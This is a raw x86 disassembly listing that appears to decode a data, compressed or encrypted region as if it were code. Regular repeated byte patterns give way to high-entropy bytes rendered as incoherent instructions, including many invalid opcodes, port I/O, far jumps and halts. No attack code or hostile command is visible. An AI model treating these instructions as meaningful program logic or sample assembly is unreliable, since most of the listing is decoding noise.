  40a9bd:	64 a4                	movsb  %fs:(%esi),%es:(%edi)
  40a9bf:	64 a4                	movsb  %fs:(%esi),%es:(%edi)
  40a9c1:	64 a4                	movsb  %fs:(%esi),%es:(%edi)
  40a9c3:	64 a4                	movsb  %fs:(%esi),%es:(%edi)
  40a9c5:	64 a4                	movsb  %fs:(%esi),%es:(%edi)
  40a9c7:	64 a4                	movsb  %fs:(%esi),%es:(%edi)
  40a9c9:	64 a4                	movsb  %fs:(%esi),%es:(%edi)
  40a9cb:	64 a4                	movsb  %fs:(%esi),%es:(%edi)
  40a9cd:	64 a4                	movsb  %fs:(%esi),%es:(%edi)
  40a9cf:	64 a4                	movsb  %fs:(%esi),%es:(%edi)
  40a9d1:	64 a4                	movsb  %fs:(%esi),%es:(%edi)
  40a9d3:	64 a4                	movsb  %fs:(%esi),%es:(%edi)
  40a9d5:	64 a4                	movsb  %fs:(%esi),%es:(%edi)
  40a9d7:	64 a4                	movsb  %fs:(%esi),%es:(%edi)
  40a9d9:	64 a4                	movsb  %fs:(%esi),%es:(%edi)
  40a9db:	64 a4                	movsb  %fs:(%esi),%es:(%edi)
  40a9dd:	64 a4                	movsb  %fs:(%esi),%es:(%edi)
  40a9df:	64 a4                	movsb  %fs:(%esi),%es:(%edi)
  40a9e1:	64 a4                	movsb  %fs:(%esi),%es:(%edi)
  40a9e3:	64 a4                	movsb  %fs:(%esi),%es:(%edi)
  40a9e5:	64 a4                	movsb  %fs:(%esi),%es:(%edi)
  40a9e7:	64 a4                	movsb  %fs:(%esi),%es:(%edi)
  40a9e9:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40a9eb:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40a9ed:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40a9ef:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40a9f1:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40a9f3:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40a9f5:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40a9f7:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40a9f9:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40a9fb:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40a9fd:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40a9ff:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40aa01:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40aa03:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40aa05:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40aa07:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40aa09:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40aa0b:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40aa0d:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40aa0f:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40aa11:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40aa13:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40aa15:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40aa17:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40aa19:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40aa1b:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40aa1d:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40aa1f:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40aa21:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40aa23:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40aa25:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40aa27:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  40aa29:	66 a6                	data16 cmpsb %es:(%edi),%ds:(%esi)
  40aa2b:	66 a6                	data16 cmpsb %es:(%edi),%ds:(%esi)
  40aa2d:	66 a6                	data16 cmpsb %es:(%edi),%ds:(%esi)
  40aa2f:	66 a6                	data16 cmpsb %es:(%edi),%ds:(%esi)
  40aa31:	66 a6                	data16 cmpsb %es:(%edi),%ds:(%esi)
  40aa33:	66 a6                	data16 cmpsb %es:(%edi),%ds:(%esi)
  40aa35:	66 a6                	data16 cmpsb %es:(%edi),%ds:(%esi)
  40aa37:	66 a6                	data16 cmpsb %es:(%edi),%ds:(%esi)
  40aa39:	66 a6                	data16 cmpsb %es:(%edi),%ds:(%esi)
  40aa3b:	66 a6                	data16 cmpsb %es:(%edi),%ds:(%esi)
  40aa3d:	66 a6                	data16 cmpsb %es:(%edi),%ds:(%esi)
  40aa3f:	66 a6                	data16 cmpsb %es:(%edi),%ds:(%esi)
  40aa41:	66 a6                	data16 cmpsb %es:(%edi),%ds:(%esi)
  40aa43:	66 a6                	data16 cmpsb %es:(%edi),%ds:(%esi)
  40aa45:	66 a6                	data16 cmpsb %es:(%edi),%ds:(%esi)
  40aa47:	66 a6                	data16 cmpsb %es:(%edi),%ds:(%esi)
  40aa49:	66 a6                	data16 cmpsb %es:(%edi),%ds:(%esi)
  40aa4b:	66 a6                	data16 cmpsb %es:(%edi),%ds:(%esi)
  40aa4d:	66 a6                	data16 cmpsb %es:(%edi),%ds:(%esi)
  40aa4f:	66 a6                	data16 cmpsb %es:(%edi),%ds:(%esi)
  40aa51:	66 a6                	data16 cmpsb %es:(%edi),%ds:(%esi)
  40aa53:	66 a6                	data16 cmpsb %es:(%edi),%ds:(%esi)
  40aa55:	66 a6                	data16 cmpsb %es:(%edi),%ds:(%esi)
  40aa57:	66 a6                	data16 cmpsb %es:(%edi),%ds:(%esi)
  40aa59:	67 a7                	cmpsl  %es:(%di),%ds:(%si)
  40aa5b:	67 a7                	cmpsl  %es:(%di),%ds:(%si)
  40aa5d:	67 a7                	cmpsl  %es:(%di),%ds:(%si)
  40aa5f:	67 a7                	cmpsl  %es:(%di),%ds:(%si)
  40aa61:	67 a7                	cmpsl  %es:(%di),%ds:(%si)
  40aa63:	67 a7                	cmpsl  %es:(%di),%ds:(%si)
  40aa65:	67 a7                	cmpsl  %es:(%di),%ds:(%si)
  40aa67:	67 a7                	cmpsl  %es:(%di),%ds:(%si)
  40aa69:	67 a7                	cmpsl  %es:(%di),%ds:(%si)
  40aa6b:	67 a7                	cmpsl  %es:(%di),%ds:(%si)
  40aa6d:	67 a7                	cmpsl  %es:(%di),%ds:(%si)
  40aa6f:	67 a7                	cmpsl  %es:(%di),%ds:(%si)
  40aa71:	67 a7                	cmpsl  %es:(%di),%ds:(%si)
  40aa73:	67 a7                	cmpsl  %es:(%di),%ds:(%si)
  40aa75:	67 a7                	cmpsl  %es:(%di),%ds:(%si)
  40aa77:	67 a7                	cmpsl  %es:(%di),%ds:(%si)
  40aa79:	67 a7                	cmpsl  %es:(%di),%ds:(%si)
  40aa7b:	67 a7                	cmpsl  %es:(%di),%ds:(%si)
  40aa7d:	67 a7                	cmpsl  %es:(%di),%ds:(%si)
  40aa7f:	67 a7                	cmpsl  %es:(%di),%ds:(%si)
  40aa81:	67 a7                	cmpsl  %es:(%di),%ds:(%si)
  40aa83:	67 a7                	cmpsl  %es:(%di),%ds:(%si)
  40aa85:	67 a7                	cmpsl  %es:(%di),%ds:(%si)
  40aa87:	67 a7                	cmpsl  %es:(%di),%ds:(%si)
  40aa89:	68 a8 68 a8 68       	push   $0x68a868a8
  40aa8e:	a8 68                	test   $0x68,%al
  40aa90:	a8 68                	test   $0x68,%al
  40aa92:	a8 68                	test   $0x68,%al
  40aa94:	a8 68                	test   $0x68,%al
  40aa96:	a8 68                	test   $0x68,%al
  40aa98:	a8 61                	test   $0x61,%al
  40aa9a:	a0 60 a0 61 a0       	mov    0xa061a060,%al
  40aa9f:	60                   	pusha
  40aaa0:	a0 60 a0 eb 60       	mov    0x60eba060,%al
  40aaa5:	60                   	pusha
  40aaa6:	2d a0 a0 60 a0       	sub    $0xa060a0a0,%eax
  40aaab:	eb 60                	jmp    0x40ab0d
  40aaad:	60                   	pusha
  40aaae:	a0 eb 60 60 a0       	mov    0xa06060eb,%al
  40aab3:	60                   	pusha
  40aab4:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40aab9:	f6 d0                	not    %al
  40aabb:	67 17                	addr16 pop %ss
  40aabd:	8c 01                	mov    %es,(%ecx)
  40aabf:	6e                   	outsb  %ds:(%esi),(%dx)
  40aac0:	8e 1a                	mov    (%edx),%ds
  40aac2:	f1                   	int1
  40aac3:	69 39 79 64 cd a7    	imul   $0xa7cd6479,(%ecx),%edi
  40aac9:	ef                   	out    %eax,(%dx)
  40aaca:	94                   	xchg   %eax,%esp
  40aacb:	ca 10 95             	lret   $0x9510
  40aace:	45                   	inc    %ebp
  40aacf:	c3                   	ret
  40aad0:	89 03                	mov    %eax,(%ebx)
  40aad2:	35 c4 3e 92 28       	xor    $0x28923ec4,%eax
  40aad7:	3b ae 04 58 3c 19    	cmp    0x193c5804(%esi),%ebp
  40aadd:	7e 89                	jle    0x40aa68
  40aadf:	35 80 e8 79 32       	xor    $0x3279e880,%eax
  40aae4:	37                   	aaa
  40aae5:	8b ec                	mov    %esp,%ebp
  40aae7:	16                   	push   %ss
  40aae8:	a9 1d 1c 11 1e       	test   $0x1e111c1d,%eax
  40aaed:	67 cd 18             	addr16 int $0x18
  40aaf0:	87 f1                	xchg   %esi,%ecx
  40aaf2:	bd 1f 30 c4 b0       	mov    $0xb0c4301f,%ebp
  40aaf7:	17                   	pop    %ss
  40aaf8:	bd 52 c0 10 0a       	mov    $0xa10c052,%ebp
  40aafd:	a8 11                	test   $0x11,%al
  40aaff:	19 93 3e e1 1e 24    	sbb    %edx,0x241ee13e(%ebx)
  40ab05:	dd 74 3a ba          	fnsave -0x46(%edx,%edi,1)
  40ab09:	4b                   	dec    %ebx
  40ab0a:	84 3d 0d b1 55 34    	test   %bh,0x3455b10d
  40ab10:	94                   	xchg   %eax,%esp
  40ab11:	27                   	daa
  40ab12:	25 33 23 b6 38       	and    $0x38b62333,%eax
  40ab17:	cc                   	int3
  40ab18:	b3 20                	mov    $0x20,%bl
  40ab1a:	48                   	dec    %eax
  40ab1b:	cb                   	lret
  40ab1c:	04 da                	add    $0xda,%al
  40ab1e:	99                   	cltd
  40ab1f:	c2 9d 4c             	ret    $0x4c9d
  40ab22:	69 c5 2a af fc 61    	imul   $0x61fcaf2a,%ebp,%eax
  40ab28:	b4 39                	mov    $0x39,%ah
  40ab2a:	0c 66                	or     $0x66,%al
  40ab2c:	03 c3                	add    %ebx,%eax
  40ab2e:	dd 6f 9a             	(bad) -0x66(%edi)
  40ab31:	55                   	push   %ebp
  40ab32:	ad                   	lods   %ds:(%esi),%eax
  40ab33:	68 2d 28 c0 ce       	push   $0xcec0282d
  40ab38:	db be b0 c9 ec 44    	fstpt  0x44ecc9b0(%esi)
  40ab3e:	e1 c0                	loope  0x40ab00
  40ab40:	75 d2                	jne    0x40ab14
  40ab42:	11 c7                	adc    %eax,%edi
  40ab44:	42                   	inc    %edx
  40ab45:	31 84 63 dc a7 74 64 	xor    %eax,0x6474a7dc(%ebx,%eiz,2)
  40ab4c:	eb 5d                	jmp    0x40abab
  40ab4e:	25 6d 72 cb 55       	and    $0x55cb726d,%eax
  40ab53:	6a 45                	push   $0x45
  40ab55:	5a                   	pop    %edx
  40ab56:	48                   	dec    %eax
  40ab57:	15 d5 cc 38 12       	adc    $0x1238ccd5,%eax
  40ab5c:	e2 36                	loop   0x40ab94
  40ab5e:	69 1b 7b a0 99 1c    	imul   $0x1c99a07b,(%ebx),%ebx
  40ab64:	4c                   	dec    %esp
  40ab65:	43                   	inc    %ebx
  40ab66:	0c 38                	or     $0x38,%al
  40ab68:	d2 d5                	rcl    %cl,%ch
  40ab6a:	fc                   	cld
  40ab6b:	3f                   	aas
  40ab6c:	e5 2f                	in     $0x2f,%eax
  40ab6e:	ad                   	lods   %ds:(%esi),%eax
  40ab6f:	36 7c b9             	ss jl  0x40ab2b
  40ab72:	dd 31                	fnsave (%ecx)
  40ab74:	4b                   	dec    %ebx
  40ab75:	0c d0                	or     $0xd0,%al
  40ab77:	39 c6                	cmp    %eax,%esi
  40ab79:	9a a0 3e f1 e0 f1 37 	lcall  $0x37f1,$0xe0f13ea0
  40ab80:	68 76 01 30 5f       	push   $0x5f300176
  40ab85:	15 94 14 c1 83       	adc    $0x83c11494,%eax
  40ab8a:	64 13 f6             	fs adc %esi,%esi
  40ab8d:	f9                   	stc
  40ab8e:	35 1a 6f 6f 45       	xor    $0x456f6f1a,%eax
  40ab93:	1d 58 fe 58 62       	sbb    $0x6258fe58,%eax
  40ab98:	c8 68 28 65          	enter  $0x2868,$0x65
  40ab9c:	ff 12                	call   *(%edx)
  40ab9e:	79 6c                	jns    0x40ac0c
  40aba0:	66 84 89 6b 51 e7 1c 	data16 test %cl,0x1ce7516b(%ecx)
  40aba7:	cf                   	iret
  40aba8:	cf                   	iret
  40aba9:	71 ec                	jno    0x40ab97
  40abab:	c8 f8 0b bd          	enter  $0xbf8,$0xbd
  40abaf:	c1 61 9d cd          	shll   $0xcd,-0x63(%ecx)
  40abb3:	c6                   	(bad)
  40abb4:	56                   	push   %esi
  40abb5:	f0 e1 3c             	lock loope 0x40abf4
  40abb8:	16                   	push   %ss
  40abb9:	66 11 3b             	adc    %di,(%ebx)
  40abbc:	a1 1c c0 32 38       	mov    0x3832c01c,%eax
  40abc1:	8a b0 35 8f e9 25    	mov    0x25e98f35(%eax),%dh
  40abc7:	11 11                	adc    %edx,(%ecx)
  40abc9:	7f 55                	jg     0x40ac20
  40abcb:	16                   	push   %ss
  40abcc:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40abcd:	05 84 1f 3f 93       	add    $0x933f1f84,%eax
  40abd2:	74 18                	je     0x40abec
  40abd4:	88 02                	mov    %al,(%edx)
  40abd6:	69 67 18 94 99 60 af 	imul   $0xaf609994,0x18(%edi),%esp
  40abdd:	ee                   	out    %al,(%dx)
  40abde:	48                   	dec    %eax
  40abdf:	69 36 78 38 6e 81    	imul   $0x816e3878,(%esi),%esi
  40abe5:	1b ad ca 1f 8d dd    	sbb    -0x2272e036(%ebp),%ebp
  40abeb:	cd a8                	int    $0xa8
  40abed:	f7 0c c4 31 61 fc c3 	testl  $0xc3fc6131,(%esp,%eax,8)
  40abf4:	86 54 f1 cb          	xchg   %dl,-0x35(%ecx,%esi,8)
  40abf8:	0b c2                	or     %edx,%eax
  40abfa:	01 cc                	add    %ecx,%esp
  40abfc:	bc 38 d0 c5 25       	mov    $0x25c5d038,%esp
  40ac01:	ae                   	scas   %es:(%edi),%al
  40ac02:	a0 c2 92 4d 35       	mov    0x354d92c2,%al
  40ac07:	66 0c db             	data16 or $0xdb,%al
  40ac0a:	45                   	inc    %ebp
  40ac0b:	61                   	popa
  40ac0c:	bb 21 94 68 22       	mov    $0x22689421,%ebx
  40ac11:	b7 64                	mov    $0x64,%bh
  40ac13:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac14:	95                   	xchg   %eax,%ebp
  40ac15:	26 79 10             	es jns 0x40ac28
  40ac18:	05 b0 89 17 b2       	add    $0xb21789b0,%eax
  40ac1d:	4a                   	dec    %edx
  40ac1e:	58                   	pop    %eax
  40ac1f:	1e                   	push   %ds
  40ac20:	2b dc                	sub    %esp,%ebx
  40ac22:	28 19                	sub    %bl,(%ecx)
  40ac24:	9c                   	pushf
  40ac25:	3f                   	aas
  40ac26:	bd 3d 02 a9 cd       	mov    $0xcda9023d,%ebp
  40ac2b:	3a b5 53 1c 33 2c    	cmp    0x2c331c53(%ebp),%dh
  40ac31:	c5 ec 34             	(bad)
  40ac34:	9b                   	fwait
  40ac35:	b8 01 12 ed 2e       	mov    $0x2eed1201,%eax
  40ac3a:	f1                   	int1
  40ac3b:	15 da d4 a0 1c       	adc    $0x1ca0d4da,%eax
  40ac40:	43                   	inc    %ebx
  40ac41:	42                   	inc    %edx
  40ac42:	d0 1b                	rcrb   $1,(%ebx)
  40ac44:	74 a1                	je     0x40abe7
  40ac46:	45                   	inc    %ebp
  40ac47:	3f                   	aas
  40ac48:	ea 37 35 38 dd cd 64 	ljmp   $0x64cd,$0xdd383537
  40ac4f:	31 44 5b 94          	xor    %eax,-0x6c(%ebx,%ebx,2)
  40ac53:	36 73 ca             	ss jae 0x40ac20
  40ac56:	89 c9                	mov    %ecx,%ecx
  40ac58:	e3 5c                	jecxz  0x40acb6
  40ac5a:	79 ce                	jns    0x40ac2a
  40ac5c:	d4 a6                	aam    $0xa6
  40ac5e:	28 c7                	sub    %al,%bh
  40ac60:	4d                   	dec    %ebp
  40ac61:	30 58 c0             	xor    %bl,-0x40(%eax)
  40ac64:	7a d3                	jp     0x40ac39
  40ac66:	cd 64                	int    $0x64
  40ac68:	e4 45                	in     $0x45,%al
  40ac6a:	bd 63 d3 bf ec       	mov    $0xecbfd363,%ebp
  40ac6f:	6a 4a                	push   $0x4a
  40ac71:	29 1c 6d 7d 9c 11 65 	sub    %ebx,0x65119c7d(,%ebp,2)
  40ac78:	f0 0a e1             	lock or %cl,%ah
  40ac7b:	62 c7 70             	(bad) {rd-bad},{bad}
  40ac7e:	b0 6b                	mov    $0x6b,%al
  40ac80:	5e                   	pop    %esi
  40ac81:	e6 c0                	out    %al,$0xc0
  40ac83:	6c                   	insb   (%dx),%es:(%edi)
  40ac84:	69 85 55 c8 f7 13 25 	imul   $0x69c0cf25,0x13f7c855(%ebp),%eax
  40ac8b:	cf c0 69 
  40ac8e:	74 c6                	je     0x40ac56
  40ac90:	59                   	pop    %ecx
  40ac91:	ff 84 c1 6e 6e 99 3e 	incl   0x3e996e6e(%ecx,%eax,8)
  40ac98:	fe                   	(bad)
  40ac99:	f8                   	clc
  40ac9a:	69 39 c9 82 38 30    	imul   $0x303882c9,(%ecx),%edi
  40aca0:	50                   	push   %eax
  40aca1:	14 48                	adc    $0x48,%al
  40aca3:	37                   	aaa
  40aca4:	67 77 dd             	addr16 ja 0x40ac84
  40aca7:	13 f9                	adc    %ecx,%edi
  40aca9:	e1 ad                	loope  0x40ac58
  40acab:	14 ce                	adc    $0xce,%al
  40acad:	9b                   	fwait
  40acae:	fc                   	cld
  40acaf:	1d 57 0d 0c 1a       	sbb    $0x1a0c0d57,%eax
  40acb4:	60                   	pusha
  40acb5:	80 23 18             	andb   $0x18,(%ebx)
  40acb8:	8d 16                	lea    (%esi),%edx
  40acba:	53                   	push   %ebx
  40acbb:	1f                   	pop    %ds
  40acbc:	3a 6c 82 16          	cmp    0x16(%edx,%eax,4),%ch
  40acc0:	a3 fa 72 11 14       	mov    %eax,0x141172fa
  40acc5:	99                   	cltd
  40acc6:	e7 35                	out    %eax,$0x35
  40acc8:	8a 0f                	mov    (%edi),%cl
  40acca:	17                   	pop    %ss
  40accb:	32 3d 75 c6 3b a4    	xor    0xa43bc675,%bh
  40acd1:	e3 b6                	jecxz  0x40ac89
  40acd3:	3c 13                	cmp    $0x13,%al
  40acd5:	72 ab                	jb     0x40ac82
  40acd7:	c3                   	ret
  40acd8:	83 e4 db             	and    $0xffffffdb,%esp
  40acdb:	c4 34 9e             	les    (%esi,%ebx,4),%esi
  40acde:	0a cd                	or     %ch,%cl
  40ace0:	ad                   	lods   %ds:(%esi),%eax
  40ace1:	08 fa                	or     %bh,%dl
  40ace3:	ca 1a 6b             	lret   $0x6b1a
  40ace6:	6f                   	outsl  %ds:(%esi),(%dx)
  40ace7:	6e                   	outsb  %ds:(%esi),(%dx)
  40ace8:	84 fd                	test   %bh,%ch
  40acea:	9f                   	lahf
  40aceb:	69 33 87 4e 60 aa    	imul   $0xaa604e87,(%ebx),%esi
  40acf1:	11 3e                	adc    %edi,(%esi)
  40acf3:	67 1d a4 33 6f 90    	addr16 sbb $0x906f33a4,%eax
  40acf9:	32 43 68             	xor    0x68(%ebx),%al
  40acfc:	27                   	daa
  40acfd:	c8 92 61 be          	enter  $0x6192,$0xbe
  40ad01:	5e                   	pop    %esi
  40ad02:	62 66 09             	bound  %esp,0x9(%esi)
  40ad05:	bd f7 c2 97 2b       	mov    $0x2b97c2f7,%ebp
  40ad0a:	07                   	pop    %es
  40ad0b:	c5 20                	lds    (%eax),%esp
  40ad0d:	d1 d6                	rcl    $1,%esi
  40ad0f:	cc                   	int3
  40ad10:	b9 47 a6 cb 0e       	mov    $0xecba647,%ecx
  40ad15:	d6                   	salc
  40ad16:	bb 34 9e 40 cb       	mov    $0xcb409e34,%ebx
  40ad1b:	33 29                	xor    (%ecx),%ebp
  40ad1d:	ba 1a 3a b0 2c       	mov    $0x2cb03a1a,%edx
  40ad22:	ea 3d 07 cf 7f 19 99 	ljmp   $0x9919,$0x7fcf073d
  40ad29:	59                   	pop    %ecx
  40ad2a:	8f                   	(bad)
  40ad2b:	1e                   	push   %ds
  40ad2c:	2e a3 5e 17 b7 35    	mov    %eax,%cs:0x35b7175e
  40ad32:	2e 10 00             	adc    %al,%cs:(%eax)
  40ad35:	48                   	dec    %eax
  40ad36:	43                   	inc    %ebx
  40ad37:	36 76 de             	ss jbe 0x40ad18
  40ad3a:	33 31                	xor    (%ecx),%esi
  40ad3c:	41                   	inc    %ecx
  40ad3d:	24 62                	and    $0x62,%al
  40ad3f:	38 d8                	cmp    %bl,%al
  40ad41:	b2 92                	mov    $0x92,%dl
  40ad43:	3f                   	aas
  40ad44:	ef                   	out    %eax,(%dx)
  40ad45:	51                   	push   %ecx
  40ad46:	07                   	pop    %es
  40ad47:	1b 71 c7             	sbb    -0x39(%ecx),%esi
  40ad4a:	f7 1c 46             	negl   (%esi,%eax,2)
  40ad4d:	3d a6 15 df ab       	cmp    $0xabdf15a6,%eax
  40ad52:	d6                   	salc
  40ad53:	12 e8                	adc    %al,%ch
  40ad55:	3a cb                	cmp    %bl,%cl
  40ad57:	6d                   	insl   (%dx),%es:(%edi)
  40ad58:	78 ac                	js     0x40ad06
  40ad5a:	bb 6a 4f 56 ea       	mov    $0xea564f6a,%ebx
  40ad5f:	63 d6                	arpl   %edx,%esi
  40ad61:	c0 1a 64             	rcrb   $0x64,(%edx)
  40ad64:	e1 23                	loope  0x40ad89
  40ad66:	8f c0                	pop    %eax
  40ad68:	7f b5                	jg     0x40ad1f
  40ad6a:	7f c7                	jg     0x40ad33
  40ad6c:	48                   	dec    %eax
  40ad6d:	4f                   	dec    %edi
  40ad6e:	2e ce                	cs into
  40ad70:	d1 d9                	rcr    $1,%ecx
  40ad72:	5e                   	pop    %esi
  40ad73:	c9                   	leave
  40ad74:	e6 ec                	out    %al,$0xec
  40ad76:	53                   	push   %ebx
  40ad77:	c1 6b 7a 23          	shrl   $0x23,0x7a(%ebx)
  40ad7b:	c6                   	(bad)
  40ad7c:	5c                   	pop    %esp
  40ad7d:	00 72 cf             	add    %dh,-0x31(%edx)
  40ad80:	c5 96 82 c8 f2 f5    	lds    -0xa0d377e(%esi),%edx
  40ad86:	17                   	pop    %ss
  40ad87:	6c                   	insb   (%dx),%es:(%edi)
  40ad88:	6c                   	insb   (%dx),%es:(%edi)
  40ad89:	63 e7                	arpl   %esp,%edi
  40ad8b:	6b 5b 19 b6          	imul   $0xffffffb6,0x19(%ebx),%ebx
  40ad8f:	62 c2 8f c6 65       	(bad)
  40ad94:	f5                   	cmc
  40ad95:	1e                   	push   %ds
  40ad96:	db 1a                	fistpl (%edx)
  40ad98:	65 88 ab 1d 52 f2 fa 	mov    %ch,%gs:-0x50dade3(%ebx)
  40ad9f:	14 cb                	adc    $0xcb,%al
  40ada1:	64 0a 13             	or     %fs:(%ebx),%dl
  40ada4:	fc                   	cld
  40ada5:	07                   	pop    %es
  40ada6:	9f                   	lahf
  40ada7:	37                   	aaa
  40ada8:	62 91 6f 30 55 eb    	bound  %edx,-0x14aacf91(%ecx)
  40adae:	3e 39 cc             	ds cmp %ecx,%esp
  40adb1:	7d 4e                	jge    0x40ae01
  40adb3:	3e fb                	ds sti
  40adb5:	10 62 c4             	adc    %ah,-0x3c(%edx)
  40adb8:	3b 86 92 c3 8c fc    	cmp    -0x3733c6e(%esi),%eax
  40adbe:	43                   	inc    %ebx
  40adbf:	ca 15 6a             	lret   $0x6a15
  40adc2:	33 cd                	xor    %ebp,%ecx
  40adc4:	a2 09 a6 69 3c       	mov    %al,0x3c69a609
  40adc9:	9f                   	lahf
  40adca:	d6                   	salc
  40adcb:	6e                   	outsb  %ds:(%esi),(%dx)
  40adcc:	8b e5                	mov    %ebp,%esp
  40adce:	07                   	pop    %es
  40adcf:	67 12 73 f7          	adc    -0x9(%bp,%di),%dh
  40add3:	60                   	pusha
  40add4:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40add5:	e2 ea                	loop   0x40adc1
  40add7:	1f                   	pop    %ds
  40add8:	35 74 1a 18 82       	xor    $0x82181a74,%eax
  40addd:	0e                   	push   %cs
  40adde:	cb                   	lret
  40addf:	11 1b                	adc    %ebx,(%ebx)
  40ade1:	98                   	cwtl
  40ade2:	bb 16 ac fb 2e       	mov    $0x2efbac16,%ebx
  40ade7:	32 32                	xor    (%edx),%dh
  40ade9:	6d                   	insl   (%dx),%es:(%edi)
  40adea:	5e                   	pop    %esi
  40adeb:	35 85 17 8f 3c       	xor    $0x3c8f1785,%eax
  40adf0:	1c 81                	sbb    $0x81,%al
  40adf2:	7f 3b                	jg     0x40ae2f
  40adf4:	ab                   	stos   %eax,%es:(%edi)
  40adf5:	34 72                	xor    $0x72,%al
  40adf7:	33 26                	xor    (%esi),%esp
  40adf9:	a2 82 34 91 58       	mov    %al,0x58913482
  40adfe:	53                   	push   %ebx
  40adff:	3d 08 ce 23 3a       	cmp    $0x3a23ce08,%eax
  40ae04:	bf 2d b6 1e 21       	mov    $0x211eb62d,%edi
  40ae09:	bb c6 19 96 41       	mov    $0x419619c6,%ebx
  40ae0e:	17                   	pop    %ss
  40ae0f:	10 0f                	adc    %cl,(%edi)
  40ae11:	d7                   	xlat   %ds:(%ebx)
  40ae12:	e7 17                	out    %eax,$0x17
  40ae14:	b8 46 fa 68 28       	mov    $0x2868fa46,%eax
  40ae19:	d0 0a                	rorb   $1,(%edx)
  40ae1b:	6f                   	outsl  %ds:(%esi),(%dx)
  40ae1c:	9f                   	lahf
  40ae1d:	2a db                	sub    %bl,%bl
  40ae1f:	66 06                	pushw  %es
  40ae21:	bc ab 61 b1 5f       	mov    $0x5fb161ab,%esp
  40ae26:	3e c5 2f             	lds    %ds:(%edi),%ebp
  40ae29:	c9                   	leave
  40ae2a:	4e                   	dec    %esi
  40ae2b:	c2 98 33             	ret    $0x3398
  40ae2e:	9f                   	lahf
  40ae2f:	cb                   	lret
  40ae30:	01 a5 6f cc b6 d8    	add    %esp,-0x27493391(%ebp)
  40ae36:	82 6a 40 4e          	subb   $0x4e,0x40(%edx)
  40ae3a:	72 6d                	jb     0x40aea9
  40ae3c:	77 b4                	ja     0x40adf2
  40ae3e:	23 64 ee 22          	and    0x22(%esi,%ebp,8),%esp
  40ae42:	53                   	push   %ebx
  40ae43:	63 d9                	arpl   %ebx,%ecx
  40ae45:	c1 c6 c7             	rol    $0xc7,%esi
  40ae48:	47                   	inc    %edi
  40ae49:	57                   	push   %edi
  40ae4a:	b6 c0                	mov    $0xc0,%dh
  40ae4c:	70 ad                	jo     0x40adfb
  40ae4e:	e7 c9                	out    %eax,$0xc9
  40ae50:	e9 3b 17 ce de       	jmp    0xdf0ec590
  40ae55:	aa                   	stos   %al,%es:(%edi)
  40ae56:	0a 31                	or     (%ecx),%dh
  40ae58:	4e                   	dec    %esi
  40ae59:	3c fa                	cmp    $0xfa,%al
  40ae5b:	36 79 c6             	ss jns 0x40ae24
  40ae5e:	ab                   	stos   %eax,%es:(%edi)
  40ae5f:	3f                   	aas
  40ae60:	e0 50                	loopne 0x40aeb2
  40ae62:	db 38                	fstpt  (%eax)
  40ae64:	d7                   	xlat   %ds:(%ebx)
  40ae65:	b3 4e                	mov    $0x4e,%bl
  40ae67:	1c 49                	sbb    $0x49,%al
  40ae69:	25 3e 1b 7e df       	and    $0xdf7e1b3e,%eax
  40ae6e:	6f                   	outsl  %ds:(%esi),(%dx)
  40ae6f:	12 e7                	adc    %bh,%ah
  40ae71:	49                   	dec    %ecx
  40ae72:	9f                   	lahf
  40ae73:	15 d0 7c 92 1d       	adc    $0x1d927cd0,%eax
  40ae78:	5d                   	pop    %ebp
  40ae79:	ea 62 1a 6a 90 33 13 	ljmp   $0x1333,$0x906a1a62
  40ae80:	f3 06                	repz push %es
  40ae82:	43                   	inc    %ebx
  40ae83:	14 c4                	adc    $0xc4,%al
  40ae85:	65 d6                	gs salc
  40ae87:	30 5a f3             	xor    %bl,-0xd(%edx)
  40ae8a:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40ae8b:	37                   	aaa
  40ae8c:	6d                   	insl   (%dx),%es:(%edi)
  40ae8d:	89 f7                	mov    %esi,%edi
  40ae8f:	3e f4                	ds hlt
  40ae91:	1f                   	pop    %ds
  40ae92:	07                   	pop    %es
  40ae93:	39 c3                	cmp    %eax,%ebx
  40ae95:	8e 1a                	mov    (%edx),%ds
  40ae97:	c6                   	(bad)
  40ae98:	53                   	push   %ebx
  40ae99:	18 ea                	sbb    %ch,%dl
  40ae9b:	c1 64 62 bb c8       	shll   $0xc8,-0x45(%edx,%eiz,2)
  40aea0:	fd                   	std
  40aea1:	f4                   	hlt
  40aea2:	cb                   	lret
  40aea3:	cf                   	iret
  40aea4:	ca 97 5e             	lret   $0x5e97
  40aea7:	6b 54 01 2e 6c       	imul   $0x6c,0x2e(%ecx,%eax,1),%edx
  40aeac:	63 7b 7f             	arpl   %edi,0x7f(%ebx)
  40aeaf:	65 fa                	gs cli
